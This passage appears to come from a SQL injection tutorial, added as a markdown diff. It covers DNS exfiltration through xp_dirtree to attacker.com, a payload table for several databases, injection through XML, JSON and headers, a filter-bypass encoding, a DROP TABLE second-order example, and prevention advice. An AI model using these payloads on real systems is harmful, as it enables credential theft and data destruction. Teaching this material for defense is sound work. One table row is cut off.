+- If the attacker receives the request, they confirm SQL injection is possible.
+
+ **Captured DNS Request:**
+```
+attacker.com
+```
+✅ Result: The attacker knows they can use this technique to leak sensitive data.
+
+
+📌 **Step 2: Extracting Data via OAST**
+
+Once the attacker verifies that network interactions work, they modify the payload to exfiltrate sensitive data.
+
+ **Example: Extracting the Admin's Password via DNS**
+```
+'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='Administrator'); exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
+```
+
+🛠 **What Happens?**
+1. The query retrieves the admin's password from the database.
+2. It appends the password as a subdomain (e.g., `S3cure.attacker.com`).
+3. The database performs a DNS lookup, sending the password to the attacker.
+
+
+**Captured DNS Request:**
+```
+S3cure.attacker.com
+```
+✅ Result: The attacker has successfully extracted the password!
+
+
+ 
+ 📌 **Step 3: Iterating to Extract More Data**
+
+Attackers can continue extracting more data, such as:
+- Other usernames/passwords
+- Credit card details
+- Customer records
+
+They modify the payload to **leak specific database rows**:
+```
+'; exec master..xp_dirtree '//'+(SELECT TOP 1 username FROM users)+'attacker.com/a'--
+```
+
+📌 **Captured DNS Request:**
+```
+admin.attacker.com
+```
+✅ The attacker now knows that `admin` is a valid username.
+
+
+**🔹 Alternative OAST Techniques for Different Databases**
+
+Different databases have different **network functions** that attackers exploit.
+
+|**Database**|**OAST Payload (DNS Exfiltration)**|
+|---|---|
+|**MSSQL**|`exec master..xp_dirtree '//attacker.com/a'--`|
+|**MySQL**|`LOAD_FILE('\\\\attacker.com\\file')`|
+|**PostgreSQL**|`COPY (SELECT username|
+|**Oracle**|`UTL_HTTP.request('[http://attacker.com/](http://attacker.com/)'|
+
+💡 Some databases (e.g., Oracle) allow HTTP requests instead of DNS queries.
+
+---
+
+> **SQL Injection in Different Contexts**
+
+SQL injection is not limited to query strings or form inputs. It can occur in any input processed as a SQL query, including:
+
+- JSON-based requests
+- XML-based requests
+- HTTP headers (User-Agent, Referer, Cookie, etc.)
+- File uploads (metadata fields processed in SQL)
+- Custom serialization formats
+
+
+**🔍 SQL Injection in XML Requests**
+Many modern web applications accept XML data via APIs. If the application directly inserts XML input into a SQL query, attackers can inject malicious SQL statements.
+
+
+**🛠 Example: Stock Check API Vulnerability**
+
+A vulnerable API expects XML input like this:
+```
+<stockCheck>     
+<productId>123</productId>     
+<storeId>999</storeId> 
+</stockCheck>
+```
+
+The application processes this using a SQL query:
+```
+SELECT stock FROM inventory WHERE product_id = '123' AND store_id = '999'
+```
+
+If the server does **not properly sanitize input**, an attacker can inject SQL:
+```
+<stockCheck>     
+<productId>123</productId>     
+<storeId>
+999' UNION &#x53;ELECT table_name FROM information_schema.tables --
+</storeId>
+</stockCheck>
+```
+
+The `&#x53;` (Unicode S) bypasses basic SQL keyword filters. When processed, the query becomes:
+`SELECT stock FROM inventory WHERE product_id = '123' AND store_id = '999' UNION &#x53;ELECT table_name FROM information_schema.tables --`
+
+Now, the attacker can extract database schema details.
+
+
+
+**🔍 SQL Injection in JSON Requests**
+
+APIs often accept **JSON input**, which can also be exploited.
+
+**🛠 Example: Login API Vulnerability**
+
+A login API expects a JSON request like:
+```
+{     
+"username": "admin",     
+"password": "securepassword" 
+}
+```
+
+A vulnerable application might process this using:
+```
+SELECT * FROM users WHERE username = 'admin' AND password = 'securepassword'
+```
+
+An attacker can inject:
+```
+{     
+"username": "admin",     
+"password": "' OR '1'='1" 
+}
+```
+
+This results in:
+```
+SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
+```
+Since `'1'='1'` is **always true**, the attacker logs in without a password.
+
+
+
+**🔍 SQL Injection via HTTP Headers**
+
+**🛠 Example: Injecting SQL via User-Agent Header**
+
+Some applications log the User-Agent string into a database. If the input is not sanitized, an attacker can inject SQL in the header:
+```
+User-Agent: Mozilla/5.0' OR 1=1 --
+```
+
+If this gets inserted into a SQL query like:
+```
+INSERT INTO logs (user_agent) VALUES ('Mozilla/5.0' OR 1=1 -- ')
+```
+The `1=1 --` **comments out the rest** of the query, leading to unauthorized modifications.
+
+---
+
+
+> **🔍 What is Second-Order SQL Injection?**
+
+Second-order SQL injection (also called stored SQL injection) happens when user input is safely stored in a database, but later used in an unsafe way in a different query.
+
+Unlike first-order SQL injection, where the injected SQL executes immediately, second-order SQL injection sleeps inside the database until it is later processed unsafely.
+
+Secord-order SQL injection occurs by using multi-query concept (Both UPDATE and INSERT).
+```SQL
+ UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');;
+```
+
+
+**🚀 Step-by-Step Explanation**
+
+**1️⃣ How Does Second-Order SQL Injection Work?**
+
+- The initial user input is stored safely in the database.
+- Later, the stored data is retrieved and used in another SQL query.
+- If the retrieved data is not properly sanitized before reuse, an attacker’s injected SQL executes at that moment.
+
+
+**2️⃣ Example: Vulnerable User Profile Update**
+
+ **(A) Safe Initial Storage**
+
+A user updates their last name using an input field:
+```
+UPDATE users SET last_name = 'O\'Reilly' WHERE user_id = 5;
+```
+- The developer escapes the single quote (`'`) correctly, preventing SQL injection.
+- The input is safely stored in the `users` table.
+
+
+**(B) Later, Unsafe SQL Execution**
+
+When displaying users in an admin panel, the application **retrieves the last name** and constructs another query:
+```
+SELECT * FROM users WHERE last_name = 'O'Reilly';
+```
+
+**🔴 Problem:**
+- The stored value (`O'Reilly`) contains a single quote.
+- The query breaks due to improper escaping and allows SQL injection if an attacker stores a payload.
+
+
+
+**🔑 Exploiting Second-Order SQL Injection**
+
+
+**1️⃣ Attacker Stores a Malicious Payload**
+
+They update their last name as:
+```
+O'Reilly'; DROP TABLE users; --
+```
+
+ The safe storage in the database:
+```
+UPDATE users SET last_name = 'O\'Reilly\'; DROP TABLE users; --' WHERE user_id = 5;
+```
+ No issue yet because it’s stored as a normal string.
+
+
+**2️⃣ Later Query Execution is Vulnerable**
+
+When the admin searches for the user:
+```
+SELECT * FROM users WHERE last_name = 'O'Reilly'; DROP TABLE users; --';
+```
+SQL injection occurs, and the `users` table is deleted!
+
+---
+
+> **🛡️ Prevent SQL Injection: A Deep Dive**
+
+The best way to prevent it is through parameterized queries (prepared statements) and proper input validation.
+
+
+**🚨 Vulnerable Code Example (BAD)**
+```
+String query = "SELECT * FROM products WHERE category = '"+ input + "'"; 
+Statement statement = connection.createStatement(); 
+ResultSet resultSet = statement.executeQuery(query);
+```
+
+**❌ Why is this Vulnerable?**
+
+- The user input (`input`) is directly concatenated into the query string.
+- An attacker can inject malicious SQL like:
+```
+`Electronics' OR '1'='1`
+```
+
+- This turns the query into:
+```
+SELECT * FROM products WHERE category = 'Electronics' OR '1'='1'
+```
+ Since `'1'='1'` is always **true**, the query returns **all products**.
+
+
+**✅ Secure Code Example (Using Prepared Statements)**
+```
+PreparedStatement statement = connection.prepareStatement( "SELECT * FROM products WHERE category = ?" ); 
+statement.setString(1, input); 
+ResultSet resultSet = statement.executeQuery();
+```
+
+✔ Why is This Safe?
+- User input is never concatenated directly into the SQL query.
+- The `?` placeholder ensures that input is treated as data, not SQL code.
+- The database engine handles input safely, preventing injection.
+
+---
+
+
+> **🛡️ Additional Security Measures**
+
+ Least Privilege Principle:
+- The database user should have minimal permissions (e.g., no `DROP` or `DELETE` access for web users).
+
+Web Application Firewalls (WAFs):
+- A WAF can detect and block SQL injection patterns.
+
+ Escape User Input When Needed:
+- If you must use string concatenation (e.g., for dynamic table names), ensure proper escaping.
+
+Regular Security Audits:
+- Run penetration tests to find vulnerabilities before attackers do.
+
+
+
+> [!NOTE]
+> **🚀 Key Takeaways**
+> 
+> - **Use parameterized queries (prepared statements) for user input.**
+> - **Never concatenate user input into SQL queries.**
+> - **Whitelisting is needed for dynamic table/column names and ORDER BY clauses.**
+> - **Restrict database permissions to minimize damage in case of an attack.**
+
+
+---
+
